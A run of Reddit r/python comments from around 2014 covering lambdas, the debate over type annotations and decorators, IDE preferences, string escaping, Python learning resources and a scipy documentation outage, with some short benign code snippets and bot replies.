A lambda is basically a way to write an anonymous function. In the examples you listed, the lambdas and assigning them to variables could be replaced with: [61]: def key(x): return x.year [62]: def zscore(x): return (x - x.mean()) / x.std() I.e., the `lambda` keyword is followed by an optional^* list of arguments and an expression that calculates the value of the lambda for these arguments. ^* you can have a lambda without arguments that just returns the same value always: always_true = lambda: True ... print always_true()
why would you have to eliminate decorators to have type decorators that check the return value? couldn't you just reserve the type names for that? eg @int def example(a, b): return 0 could easily coexist with other decorators: @int @my_decorator def example(): "note int decorator comes first (and last)" return 0
Groupby will default to the index if you don't supply a column. You're correct - x in this case is each index value. 
Is the sexist overtone really necessary to sell this?
Or, alternatively, I shouldn't have to document type. I should be able to mouseover in my IDE and see. If you've ever used Eclipse + Java, you'd realize how unbelievably helpful this is, and how fucking fast it is. I'm a very fast Java developer because of its static typing and this IDE functionality.
Beats me. I'm not the one calling for the eradication of non-type decorators. That being said, what if you have an object called My_Decorator? Then how would you distinguish between a "regular" decorator and a type decorator?
After working on large projects in Python, C# (meh) and Javascript (ugh) I have a strong appreciation for type-checking. The thing I dislike about this decision is that it will not be checked by the interpreter, but is dependent on other tools for enforcement. Imagine a rookie programmer who doesn't have a good linter set up and isn't using a good IDE, and he proceeds to add in static type checking and discovers that it doesn't matter. Or, maybe he assigns the types incorrectly, trusts that it's handled, and gets burned because he's not using the correct tools. His conclusion: type checking in Python is broken. I think it should be enforced by the interpreter by default, then ignored when optimizations are turned on.
__^[wow ^so ^verify]__: ^/u/noisypl ^-&gt; ^/u/skillcode __^Ð100 ^Dogecoins__&amp;nbsp;^__($0.0111881)__ ^[[help]](http://www.reddit.com/r/dogetipbot/wiki/index)
I've started reading, but I'm already thinking "Why haven't these bugs in `functools.wraps()` been fixed yet?" Am I missing something?
I think you're thinking of annotations, not decorators.
yeah, the one thing obiwan lacks is type secured variables, and its an easy fix, plus you can get a nice syntax. I wrote something that supports this def word_frequencies(corpus: str): my_variable = typed({string:int}) &gt;&gt; {} #this instantiates an empty dictionary with overrides on the update, __getitem__, and __setitem__ methods to check the types of both "halves" ...
Looks like the github page is active: https://github.com/DanielStutzbach/blist Maybe create an issue.
I can't imagine it NOT assisting their static typer. It's possible it wouldn't affect final compilation, but have you ever compiled RPython? It takes **ages**. Optional typing should be mandatory in RPython and it would drastically speed up compilation, making RPython attractive as a standalone language. My guess: as PyPy/RPython is still fundamentally implemented in Py2 and they have no plans to modernise, they're unexcited by language imprpvements based on features they can't access (like annotations).
I generally use a development approach, where, if I am working on a new basic OO framework for a program, I'll break convention and use isinstance() and thrown TypeErrors in a way that would make Guido cry. Honestly, it is easier to find structural issues in the framework that way than going through stack traces to look for typing issues/misused methods. I then make sure to remove all this once I am satisfied with my fundamental class structure. Not that I have to say why, but this improves both performance gain and future extensibility... and more abstractly I guess "pythonicity". In short, this annotation would help my design flow.
emoji templating support? also it says that it's emoji terminal _output_, which is true I mean it does output emoji to the terminal (and everywhere else that accepts unicode strings).
\&gt; click through to emoji cheat sheet \&gt; "Campfire also supports a few sounds" That is both incredibly awesome and probably super annoying after a few minutes.
&gt;why would you have to eliminate decorators to have type decorators that check the return value? Because that's incompatible with what decorators currently mean.
&gt; Because that's incompatible with what decorators currently mean. A decorator is just a modification to the function. So you could just transform @return(int, None) def thingy(): return 3 if sys.argv[1] else None into def thingy(): def inner(): return 3 if sys.argv[1] else None retval = inner() assert type(retval) in (int, type(None)) return retval
That would work nicely.
Thanks for the link. I submitted an issue. Hope the guy is all right. 
Author here! I wrote this to form part of a VPS panel for my hosting company, so you can easily deploy Python packages from the web UI. It was useful for myself so I published it online. If someone else finds a use case for it, I would be happy to accept a pull request against the README! 
Once you setup PyLint and pep you are off to the races
I use `pyenv` to install different versions of Python on the system. Whenever I want to work on a project, I use `virtualenvwrapper` to create a venv for it with the Python I want using the `-p` flag. If you use `zsh`, it will already do what `autoenv` does for you, without the need for a .env file. I would err towards using as few tools as possible, you probably won't need them. tl;dr - my setup: `zsh` + `pyenv` + `virtualenvwrapper`
So, I just read through most of the conversations and I'm confused. They are caught up on the issue of whether say, `[str]` should represent a *list* of strings, or an iterable of strings (a concrete object vs. an abstract base class). But, there's a solution that seems obvious to me `...` Take a function like this def sum(vals: [int,...]) -&gt; int: pass This function takes an iterable of ints, while def need_a_list(vals: [int])-&gt; None: pass takes a concrete list. By the same token, (int, str) # a fixed length tuple (int, ...) # a variable length tuple, also this fixes the issue of length 1 tuples {str: int} # a concrete dict {str: int, ...:...} # a mutablemapping ABC {int} # there's no good alternative for set, really
I'm surprised MIT OCW wasn't on this list. I just completed the edX course a few weeks ago, and I found it to be highly informational.
Oh hey, thanks for the link to obiwan. My company is starting a new codebase that's py3 all the way. No more dual-version boilerplate. I've already put in type annotations for some confusing functions. I was wondering if anything could actually check them, and mypy didn't look far enough along yet -- though it will clearly get a lot of interest from this mailing list discussion. But obiwan looks great.
How incompatible? Decorators are just function wrappers. These would check the return value type and raise an exception if needed. 
&gt; No matter how much time you spend typing in Vim you still need to back out to a shell at some point... At which point you need to go back to the arrow keys or some other custom keybindings. You may find this shell builtin helpful: bindkey -v 
I will just say that c and languages that look like c includes a lot of languages, including, to an extent, Python
No. Cherrypy uses decorators to denote which functions are publicly accessible. Cherrypy has functions, and each function preceded by @expose makes it a webpage controller. So class Foo_Server: def not_webpage(self): pass @expose def index(self): return processed_template That would enable you to visit localhost:8080/index but not localhost:8080/not_webpage
Right - I mean the point is to create structure that guides the code. At least have a "strict" mode that enforces it or something. 
Yup, that, too. God, Eclipse + Java is such an awesome development environment, largely made possible by Java's static typing. And I *hate* Java.
Someone on this sub has about 12 or so multiple accounts and mass-downvotes opinions they don't agree with (e.g. that Python 3 &gt; Python 2), that a text editor is all that's needed to edit Python code text, etc. But it seems real people outnumber the troll 2:1, if you get into a controversial thread early and watch the voting you'll see it swing. I've hit up the mods but its actually the reddit admins that need to be involved for voting issues, I just can't be arsed seeing as the trolls lose out in the end anyway :) 
Hate to be *that guy* but if you like Eclipse then IntelliJ IDEA would make you cream your jeans. It's just better in practically every way. Has a free Community Edition if you want to give it a go.
You don't have to do the Kindle Unlimited to get this book for free. At first that's what I thought, but after looking harder I realized they are two separate offers.
Suck. 
This is true. An "integrated development environment" is essentially a collection of plugins around your text editor to assist with programming tasks. There's no difference to loading up Vim with plugins than loading up PyCharm or VS or Eclipse or whatever you have with plugins. All these software programs rely on plugins to provide functionality either not included out of the box or not configured a specific way out of the box. This is why answers of Vim, Emacs, Sumbitch Text and so forth are all valid answers; all provide plugins for integration with revision control systems, debuggers, build tools, introspection, project mgmt, etc. and hence satisfy the label "integrated development environment". 
If it could merge with toolz (and hence cytoolz) that would be killer. Lots of good stuff in here. 
It's actually not about *runtime* vs *compile* time, and it's about the order of operations. The implicit concat is a higher precedence than the method call, but the `+` operator is a lower precedence.
That's the problem: "@int" is already an arbitrary decorator. Either you have to give up arbitrary decorators or "@int" can't be a type annotation. Otherwise the program semantics become ambiguous.
Exactly right.
Looking through the edges again, it actually looks like the senses won't be of too much help because they don't seem to be used consistently. I'm trying to test a simple "If A IsA B and B IsA C then A IsA C" inference rule, and I'd like to restrict it to start and end nodes that have a sense, but I'm finding that relatively few end nodes have a sense. I've loaded about 75% of the English Conceptnet, and while there are 250k start nodes with senses, there are only around 50k end nodes with senses. Do you know why this is? This makes it nearly impossible to infer anything, because most edges link a sense to a generic word, which have no clear meaning. For example, there's an edge: /c/en/jefferson_square/n/omaha-&gt;/r/IsA-&gt;/c/en/park when I would have expected there to be an edge like: /c/en/jefferson_square/n/omaha-&gt;/r/IsA-&gt;/c/en/park/n/a_piece_of_open_land_for_recreational_use_in_an_urban_area but that one doesn't exist. If I used the first to infer anything, it would get mixed up with every use of the word "park" (album, place to put a car, a restaurant, etc), and corrupt the results. Is there any way around this? 
I like python eggs and spam! I do! I like python, Sam-I-am! And I would learn it in a boat! And I would learn it with a goat... And I will learn it in the rain. And in the dark. And on a train. And in a car. And in a tree. It's are so good so good you see! So I will learn it in a box. And I will learn it with a fox. And I will learn it in a house. And I will learn it with a mouse. And I will learn it here and there. Say! I will learn it ANHYWHERE! 
According to the license file on github, the author is now at Google; you might like to try that address also. The software itself seems to use some kind of modified BSD structure, so you're legally entitled to fork and maintain your own version within the provisions of that license. That's probably the best thing to do with open source abandonware, if the author comes back from the wilderness there's pull requests for merging, if not there's at least someone taking any necessary bug fixes. 
seems similar to other reserved words and/or built-in functions to me. there's not that many types, and they're already off limits for function names. You're talking about adding type declarations to a language that doesn't have them, so you're probably going to have to break some eggs to make that omelette. But in this case it isn't even difficult. int() checks if the argument is a function (currently not permitted) and if so checks the return value to ensure it's an int. I don't even have a position on whether this is a good idea or not - just that if you're going to use the decorator syntax, I don't understand why that makes arbitrary decorators off limits. If there's a set of reserved word decorators for type declarations, can't those live in harmony with other decorators? Is the ambiguity of that so harmful? How so? Also, from this discussion I'm tempted to write my own decorators that check return values, seems like it would be a good idea. 
true, let's see how this pans out. cheers!
solve challenges of this site using python. learning by doing :) http://www.spoj.com/ happy pythonic programming...
I'd actually be shocked if this was documented anywhere, it's pretty obscure. Nice work writing this up, I've never run into this, but it wouldn't at all surprise me if this was a "gotcha" for many users.
&gt; But in this case it isn't even difficult. int() checks if the argument is a function (currently not permitted) and if so checks the return value to ensure it's an int. That's not how decorators work. Your code is doing this: def example(a, b): pass example = int(example) That's how decorators work *now*. It's inconsistent with how you're describing type annotations should work. I'd suggest a different syntax to (1) avoid confusion, and (2) not break existing, working Python programs. Pick a different syntax for type declarations, and the two can live in harmony.
Thanks for teaching me about implicit string concatenation in Python.
I also said I hate Java :) I develop almost exclusively in JavaScript, Python, PHP, and a few templating engines like Genshi and Smarty. I like that with Eclipse I can literally write my own parsers for Genshi and Smarty if I want (indeed, someone did for Smarty, and I've been toying with creating a Genshi one for a while now).
Well, it sort of is, because that ["feature is defined at the syntactical level"](https://docs.python.org/2/reference/lexical_analysis.html#string-literal-concatenation), so it's guaranteed to have a higher precedence than any other operator.
WebStorm is a PHP/Python/JavaScript IDE by the same makers as IntelliJ. I don't think it has a free community edition though, but it does seem to have plugins for Smarty and maybe Genshi. Just checked and it doesn't have a free version but does have a 30-day trial.
Both are kind of bad style though. So I think more important than knowing this little piece of arcana you should just write idiomatic python.
Haha, I have no clue how me complaining about dynamically typed languages turned into a referendum on my IDE choice. That looks cool—it even supports AngularJS.
*Shrug* I use the implicit join all the time for multi-line strings.
On similar topic, does anyone know of any good resource to get started on Data Structures and Algorithms in Python? I think I am fairly rounded going through the basics of python and want to start on something new
Looking forward to it! :)
I think that this may ultimately be a good idea, but this is a PEP before its time: there are no widely used libraries that even support arrays with labeled axes, so it is hard to make a case that we need this feature. I have been working on an open source project to correct this deficiency [1], so I have some experience with this. In my opinion, the most awkward limitation of using method calls is when you want to insert slice objects or use `__setitem__`. You end up writing things like this: x.setitem(value, time=slice(0, 100)) insert of x[time=0:100] = value In fact, the setitem method syntax is so awkward that I haven't gotten around to implementing it yet, though we do have a indexing with keyword arguments equivalent for `__getitem__` [2]. [1] https://github.com/xray/xray [2] http://xray.readthedocs.org/en/stable/tutorial.html#indexing
This looks interesting : http://www.amazon.com/gp/aw/d/B004D9ES2U?pc_redir=1403205502&amp;robot_redir=1
Read again, I said *implementation*. RPython, the stack used to make PyPy3, is Py2 with no plans to modernise.
When I press "run" on the first example, the output gives the text string "Hello, World!" What I expected it to give was: &gt;&gt;&gt; print "Hello, World!" File "&lt;stdin&gt;", line 1 print "Hello, World!" ^ SyntaxError: invalid syntax as per the Python language spec. 
[Grokking Algorithms](http://www.manning.com/bhargava/) might be something to keep an eye on. Only two chapters are available now, but I thought the illustrated examples were fun and easy to follow. Looks like it is slated to be released next spring. There is also [Problem Solving with Algorithms and Data Structures](http://interactivepython.org/courselib/static/pythonds/index.html), which I've seen recommended quite a few places. 
It looks good, but that tutorial is for Python 2. Python 3 has been in a state where it's usable for production for quite a while now. And the number of third-party packages which have not yet been ported [is dwindling](https://python3wos.appspot.com/). **Note** that most of the packages still listed in red, are not used as libraries but are stand-alone tools, so there's no immediate need to port them to Python 3. If you're starting with Python, it would make sense to start with Python 3. The reason is that it is easier to write Python 3 and make it runnable as well on Python 2 as the other way around. Python 2.7 has a whole bunch of compatibily syntax built-in to make it work like Python 3. Maybe you need to sprinkle some `from __future__ import ...` lines into your code, but *most* of the stuff should just run as-is. Starting from Python 2 and *then* making it Python 3 compatible, can be a pain. That is also why (I think) people whine so much about making stuff Python 3 compatible.
For the curious: *Python Algorithms: Mastering Basic Algorithms in the Python Language (Expert's Voice in Open Source) (Kindle Edition) Price: US$31.99*
Heh, I guess Python 3 adoption is still just a distant reality.
The semantics of C make sense for C, java, etc, because precise type is indeed very important in them. In dynamic languages like Python, precise type is less important. a `val : Type` convention would reflect this fact.
CodeCademy is a good site...
Use [this](https://www.python.org/dev/peps/pep-0008) or [this](https://google-styleguide.googlecode.com/svn/trunk/pyguide.html) for all of your styling needs. In the case of your question, they both agree: var = val func(arg=val) 
It's just convention, not a strict rule. You can think of it as some ways of writing more readable code. It's defined by PEP-8, check it out at (also other conventions of writing code): http://legacy.python.org/dev/peps/pep-0008/
Everyone seems to overlook one important thing - imports and class declarations are **statements**. I try to put types into declarations of my methods as much as i can but there is simple roadblock - circular dependencies are real pain. Pain to a point where i just simply remove annotation. Modules i design do not depend on each other explicitly as it would be real bad design, but they use types defined within each other. Not sure how to fix this, and if it can be fixed at all, but it would be great if it could be solved somehow, because such problem renders type hinting useless if one just cant import and use those types everywhere where they are used.
Also [this Community episode](https://www.youtube.com/watch?v=mNs2sYZv98M).
The '\" character is considered an _escape_ character in Python. In order to use the "\" character literal in your string, you have to escape it, so it'll look like this 'X5\\'
True, but it only takes 15hrs to work through and it's really good practice...
Thanks for the reply. I gave that a shot but it doesn't look like it calls correctly. Here's what I get...any thoughts?: myDict = {'Bob':['X5\\']} myDict['Bob'] ['X5\\']
It is correct. If you write myDict["Bob"] in Python's "command line" (REPL) it will show you the so called "representation" of the object. This will escape backslashes when printing so it looks exactly like you would have to write it. To see how it will be presented as a string, use "print(myDict['Bob'])"
That's actually still correct! If you print 'Bob' print(myDict['Bob'][0]) you _will_ get X5\ But internally it still needs to be represented as 'X5\\\'
Yeah but do you use the format method on one of them?
You might be interested in the Udacity free course on Algorithms, https://www.udacity.com/course/cs215
That's great to know! Thank you so much for the help, that fixed everything. 
... Says the person with a 2.x-style `print` statement in user flair...
&gt;(x-post /r/learnpython) Please don't.
If you're experienced already, you'd probably be better off reading through the official Python tutorial. It's quite concise and is full of code snippets to demonstrate the language. https://docs.python.org/2/tutorial/index.html 
You can speed it up by a factor of about 10000 if you use alphagrams instead of permutations. import itertools from collections import defaultdict alphagram = lambda s: ''.join(sorted(s)) words = open('/usr/share/dict/words').read().decode('utf8').split() alphagrams = defaultdict(list) for w in words: alphagrams[alphagram(w)].append(w) rack = 'fgfirae' rack_alphagrams = [alphagram(s) for l in range(8) for s in itertools.combinations(rack, l)] correct_words = sum((alphagrams[a] for a in rack_alphagrams), []) Trivia: The rack that gives the most 7-letter words is `aeinrst`: &gt;&gt;&gt; alphagrams['aeinrst'] [u'anestri', u'antsier', u'nastier', u'ratines', u'resiant', u'retains', u'retinas', u'retsina', u'stainer', u'starnie', u'stearin'] 
Oh wait, this is spam.
Yeah. Some authors make their book free for a awhile so that it can have reviews and go up on amazon's ranking. That's why I regularly check the following links for free kindle ebooks: http://www.amazon.com/Best-Sellers-Kindle-Store-eBooks/zgbs/digital-text/154606011
http://www.codecademy.com/ has been very good for me
Ok, I thought about it and now I see why it's not a good idea. There's a fundamental difference between a slice and a range, and the reason why that syntax would be misleading. A slice only makes sense within a given context. The reason is that, differently from a range, you can have a slice in the form you gave above, or even in the form [:], where beginning and end are only meaningful within the context of a specific object. you may say that the default is zero, but why? why should [:100] be equivalent to [0:100] and why should [:] be equivalent to [0:infinity]? Only within an array that specification makes sense, capping it to -5 if the array goes from -5 to +5, for example. The problem is that using it in a loop, you have no association between a slice and the contextual container, like you have in `__getitem__`. That notation is cool, but it's breaking some fundamental assumptions and I am not sure Guido would like it. "Special cases aren't special enough" rule. I don't know. maybe it's worth posting it to python-ideas... but I am not sure I can make a compelling case for it. 
I love that show
Or the imaginary friend?
I can't access it either, really annoying. [Here's](http://wikisend.com/download/260026/scipy-0.13.3-ref.pdf) the newest pdf version of the docs I could find, in case you need it. Edit: Someone posted a mirror in the github issue linked below: http://jiffyclub.github.io/numpy/ and http://jiffyclub.github.io/scipy/
I propose, Monads.
You could always type check thanks to metaprogramming. Granted, it's not built in.
after some months - still using it, often as a cookbook for my problems
Perhaps this is a better venue to discuss it: https://github.com/jsonpickle/jsonpickle/issues/78 (assuming you're not the same person).
You'll note how recently that was opened. It's not a noted venue for discussion, either.
I haven't been able to access it either for a few days. Thanks for the pdf copy. It would be great for scipy to have a pdf copy of the docs in the project's github. Unfortunately I wasn't able to find anything like that.
What's the point of this project? (I literally would like to know why you did this, even if just to see if you could).
There's a ticket related to this: https://github.com/scipy/scipy/issues/3882 It seems that even the mailing lists are down.
Note that `+` between plain literals is also optimized away: dis.dis(lambda: "A" + "B") 1 0 LOAD_CONST 3 ('AB') 3 RETURN_VALUE Even repeats of constants are: dis.dis(lambda: "B"*4) 1 0 LOAD_CONST 3 ('BBBB') 3 RETURN_VALUE This happens at compile time, while implicit concatenation happens at *parse* time: In [220]: ast.dump(ast.parse('"A" + "B"')) Out[220]: "Module(body=[Expr(value=BinOp(left=Str(s='A'), op=Add(), right=Str(s='B')))])" In [221]: ast.dump(ast.parse('"A" "B"')) Out[221]: "Module(body=[Expr(value=Str(s='AB'))])" 
Thanks so much!
With more and more RAM in computers, you rarely hit these sorts of problems until you're working with larger datasets (or servers with a very small amount of memory). It's nice to know that there are a few techniques you can apply to reasonably quickly reduce your memory footprint and continue to use the same patterns on a couple of times the data. I certainly wasn't familiar with the `intern`ing technique!
How come for almost everything else useful Guido and Raymond Hettinger and others almost always decline to add something with the suggestion that it can be a 3rd party library instead. Now we have this issue and Guido wants to make it a language feature? We already have many fine libraries that could do this. Mandating a syntax is going to break things like PyContracts. Annotations were supposed to be left alone to let the community come up with uses and they have. Why the rush to shove all that aside? On another note the very existence/success of Python would suggest that type checking isn't a major issue; at least that's been the message from Pythonistas for many many years.
Didn't know that. Thanks!
Where is the documentation for curve_fit? I can't find it in the PDF you linked. 
This isn't the latest, but it's version 0.13.0 docs: http://students.mimuw.edu.pl/~pbechler/scipy_doc/index.html Good enough for what I'm doing at least.
http://projecteuler.net/ is a great way to practice any language (and learn math). If you like math enough.
you guys are both imputing a lot about the language from its syntax. I'm just thinking about what's clean and readable ... this isn't literature.
Annotations are next to worthless if they're not standardized. If you rely upon annotations in your code base for use with Tool A and then want to use another library that uses annotations for Tool B you could be in for a world of pain. Obviously tools should be written to not break when they encounter unexpected annotations, but that also limits the usefulness of annotations and increases the complexity for creating tooling around them.
Not sure why you're being downvoted without comments. What you suggest *is* possible, but it isn't very desirable: * Annotations are easier for static analysis tools to read without actually executing code. * Annotations can be easily ignored at runtime to forego the performance penalty and additional safety of type checking. This is possible with metaprogramming, but more effort. Further, type checking via metaprogramming has existed for a long time ([there's even a decent implementation in the Python wiki](https://wiki.python.org/moin/PythonDecoratorLibrary#Type_Enforcement_.28accepts.2Freturns.29)!) with very little uptake. It would appear that this is not a tenable option.
[The post on the mailing list](https://mail.python.org/pipermail/python-ideas/2014-August/028618.html) &gt;(We may have to have some backwards compatibility provision to avoid breaking code that currently uses annotations for some other purpose. Fortunately the only issue, at least initially, will be that when running mypy to type check such code it will produce complaints about the annotations; it will not affect how such code is executed by the Python interpreter. Nevertheless, it would be good to deprecate such alternative uses of annotations.) He seems to be aware of breaking other uses of annotations, but doesn't think those uses are as useful as having a well-defined syntax for type checking. In any event, it doesn't really stop anyone from using annotations for another purpose, it only encourages using them for type checking (which you could argue is discouraging anything else). 
Could you explain why? I really don't know.
I knew about this already, but you know, I am also looking for a library that is similar to [Ramda](http://ramdajs.com/) with auto curried functions.
The PDF reference files don't appear to be very exhaustive, unfortunately. I hope this issue is resolved soon, so I can go back to googling happily when I run into issues. You don't know what you're missing until it's gone :(
Good point. My last comment isn't really relevant in the context of discussing if python should use `val : Type` or `Type val`. It was more meant to refute that `val : Type` somehow implies that types are less important. Anyways, I still think python should use `val : Type`, because: * It reads like a relation(which is exactly what it is). `val` is of type `Type`. `:` is the "is of type" relation. * It is the standard.
The "if callable" is ill advised, but otherwise yes, `@returns_int` would work. You might even generalize it to `@returns(int)`, where the `callable` check should be turned into an assertion.
It seems Udacity changed their platform from free to paid courses. The first two weeks are free while requiring your credit card information and then they would bill you for $150/month if you don't cancel Edit: My mistake, you need to click on courseware to access the course materials instead of clicking on the free trial, thanks for the link 
Scanned the examples and as someone who never learned functional programming, my brain hurts. ;)
a @returns decorator would be pretty useful whether it's officially adopted or not both for checking against errors and code readability. I'm trying to think of how it would work for multiple return values or checking the types of a list/dict/tuple, though.
/u/pai1009 only posts links to that site and never comments.
Aw fuck thank you jesus christ I have been looking for that for hours....where did you find that? 
Perhaps @returns((list, int)) and @returns((dict, string, (list, int))).
I just googled for scipy docs and found it.
Yeah I also got a bit of a shock before I realised
PyCharm is the Python version, also has a free version.
The headaches are a sign that it's working.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**String interning**](https://en.wikipedia.org/wiki/String%20interning): [](#sfw) --- &gt; &gt;In computer science, __string interning__ is a method of storing only one copy of each distinct [string](https://en.wikipedia.org/wiki/String_(computer_science\)) value, which must be [immutable](https://en.wikipedia.org/wiki/Immutable_object). Interning strings makes some string processing tasks more time- or space-efficient at the cost of requiring more time when the string is created or interned. The distinct values are stored in a __string intern pool__. &gt;The single copy of each string is called its 'intern' and is typically looked up by a method of the string class, for example String.intern() in Java. All compile-time constant strings in Java are automatically interned using this method. &gt;String interning is supported by some modern [object-oriented](https://en.wikipedia.org/wiki/Object-oriented) [programming languages](https://en.wikipedia.org/wiki/Programming_language), including [Python](https://en.wikipedia.org/wiki/Python_(programming_language\)), [Ruby](https://en.wikipedia.org/wiki/Ruby_(programming_language\)) (with its symbols), [Java](https://en.wikipedia.org/wiki/Java_(programming_language\)) and [.NET languages](https://en.wikipedia.org/wiki/List_of_CLI_languages). [Lisp](https://en.wikipedia.org/wiki/Lisp_(programming_language\)), [Scheme](https://en.wikipedia.org/wiki/Scheme_(programming_language\)), and [Smalltalk](https://en.wikipedia.org/wiki/Smalltalk) are among the languages with a [symbol](https://en.wikipedia.org/wiki/Symbol_(programming\)) type that are basically interned strings. The library of the [Standard ML of New Jersey](https://en.wikipedia.org/wiki/Standard_ML_of_New_Jersey) contains an atom type that does the same thing. [Objective-C](https://en.wikipedia.org/wiki/Objective-C)'s selectors, which are mainly used as method names, are interned strings. [.NET languages](https://en.wikipedia.org/wiki/List_of_CLI_languages), [Lua](https://en.wikipedia.org/wiki/Lua_(programming_language\)) and [JavaScript](https://en.wikipedia.org/wiki/JavaScript) string values are immutable and interned. &gt; --- ^Interesting: [^Hash ^table](https://en.wikipedia.org/wiki/Hash_table) ^| [^Flyweight ^pattern](https://en.wikipedia.org/wiki/Flyweight_pattern) ^| [^Symbol ^\(programming)](https://en.wikipedia.org/wiki/Symbol_\(programming\)) ^| [^Hash ^consing](https://en.wikipedia.org/wiki/Hash_consing) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cjv1dss) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cjv1dss)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
&gt; (which you could argue is discouraging anything else). Meh. In general, you could argue that, yes, that encouraging one thing is discouraging everything else. In this case, though, other uses of annotations remain the same: completely possible, but obscure and unremarked upon.
It's working, or all you have is a hammer and you're using your head as a nail. ;)
http://en.wikipedia.org/wiki/Partition_problem Many sequences do not have perfect partitions: Sequence: [17, 37, 91, 106] ==&gt; diff 5: ([17, 106], [37, 91])
"There should be one, and preferably only one, obvious way to do it."
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Partition problem**](https://en.wikipedia.org/wiki/Partition%20problem): [](#sfw) --- &gt;In [computer science](https://en.wikipedia.org/wiki/Computer_science), the __partition problem__ is the task of deciding whether a given [multiset](https://en.wikipedia.org/wiki/Multiset) *S* of positive integers can be [partitioned](https://en.wikipedia.org/wiki/Partition_of_a_set) into two subsets *S*1 and *S*2 such that the sum of the numbers in *S*1 equals the sum of the numbers in *S*2. Although the partition problem is [NP-complete](https://en.wikipedia.org/wiki/NP-complete), there is a [pseudo-polynomial time](https://en.wikipedia.org/wiki/Pseudo-polynomial_time) [dynamic programming](https://en.wikipedia.org/wiki/Dynamic_programming) solution, and there are heuristics that solve the problem in many instances, either optimally or approximately. For this reason, it has been called "The Easiest Hard Problem". &gt;==== &gt;[**Image**](https://i.imgur.com/T2vlc4T.png) [^(i)](https://commons.wikimedia.org/wiki/File:Partition_Problem_DP_table_showing_dependencies.png) --- ^Interesting: [^3-partition ^problem](https://en.wikipedia.org/wiki/3-partition_problem) ^| [^Clique ^cover ^problem](https://en.wikipedia.org/wiki/Clique_cover_problem) ^| [^Subset ^sum ^problem](https://en.wikipedia.org/wiki/Subset_sum_problem) ^| [^Graph ^partition](https://en.wikipedia.org/wiki/Graph_partition) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cjv26d8) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cjv26d8)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Community edition is shit compared to Eclipse. Why the hell is everyone trying to get me to stop using what works for me?
Thanks. I have done some java so I should be able to understand these. I'm making quite a lot of headway with my project so these should be good for some Ides.
For those wondering, this is a huge improvement over using one's head as a hammer. 
But he's also talking about deprecating using any other syntax for annotations, which will affect existing libraries.
Time and wxpython.... thanks fir the response
[cx_Freeze](http://cx-freeze.sourceforge.net/). It [doesn't](http://cx-freeze.readthedocs.org/en/latest/faq.html#single-file-executables) make single executables, but as long as you pass a folder around with everything it produces you'll be fine.
How does this compare with native `pandas.sql` methods? Are these safe optimizations? Are they already merged upstream? * https://github.com/pydata/pandas/blob/master/pandas/io/sql.py * http://pandas.pydata.org/pandas-docs/stable/generated/pandas.read_sql_query.html 
Also known as "co-monads".
This is great! I love challenges, it is the only way to get good. Also, upvote for the advice on learning by doing. I used to read in the beginning, when I started programming but picked up little. I would also get bored fast. But once you make the effort to test things out, it really gets fun and ideas start to pop into your head. Part of learning any language is taking the learning into your own hands. Do not rely on other sites but aggregate your own curriculum and pace. I really appreciate this link! 
[Pytoolz](https://github.com/pytoolz/toolz)
You can't. It simply isn't possible with the way that WSGI works. See prior discussion about this at: * https://groups.google.com/forum/#!msg/modwsgi/jr2ayp0xesk/QtINxMi_KUAJ
You can't have flask kill it automatically. You could hook the window close event and have it call another web service which sends a message to your long-running process to abort. If you're interested, I can elaborate on this approach.
You're right, but there are ways of accomplishing something close to what OP desires. OP: There's honestly no way of implementing something like this using any web server and any web framework in any language. That's just not how regular old HTTP works (which is what AJAX uses). You could mess around with, for example, sending a "kill" message by passing a callback to `window.onunload`, but this won't account for a user's browser crashing. You could also use a queue or a database to track polls and timeouts, but that's annoying. Now, you *could* implement something quite close to this without a lot of additional work by using WebSockets. See: https://github.com/kennethreitz/flask-sockets WebSockets are bidirectional, connection/stream-oriented communication channels. Think of it like AJAX on steroids. All modern browsers currently support them. You can have one thread (or preferably, one gevent greenlet) handling the WebSocket communication, and as soon as the socket closes (`WebSocket.onclose`), you can pass a message that will kill the function.
 # Returns the first element of a list. @curry def head(aList): return aList[0] # Returns everything except the first element of the list. @curry def tail(aList): return aList[1:] k, great... second = head * tail # 'tail' will be applied first, then its result passed to 'head' uhu... second([1, 2, 3, 4]) # returns 2 ... wat‽ 
The author picked up on my issue and revived his server. All good now, thanks for the suggestions.
This is r/python, you could have just said Guido van Rossum instead of Python creator.
&gt;How come for almost everything else useful Guido and Raymond Hettinger and others almost always decline to add something with the suggestion that it can be a 3rd party library instead. Maybe you haven't been paying attention. What they do, is let the community come up with 10 solutions ... and then they pick one ... adding maybe a few improvements as they integrate it into python-core. This has always been their strategy ... maybe they don't advertise it with blow-horns ... but it's been dead fucking obvious. You have read "the zen of python" ... right?
Unlike libraries which are packaged up, annotations exist in what is essentially a global namespace: there's no way to inspect an annotation and know which tool it was intended for (unless they're very carefully designed and follow certain conventions...which is what we call a standard). When code imports numpy and then accesses something inside numpy, there can't be a collision with any other libraries because of namespaces. There's no confusion about where to dispatch calls: it's namespaced. You *could* effectively namespace annotations by requiring their outermost objects not be builtins - thus reusing Python's existing namespace notion within annotations. However, this already breaks existing uses of annotations and limits the expressiveness of all annotation tools. Maybe that's an ok tradeoff? I'd rather have a standard, but it's not up to me.
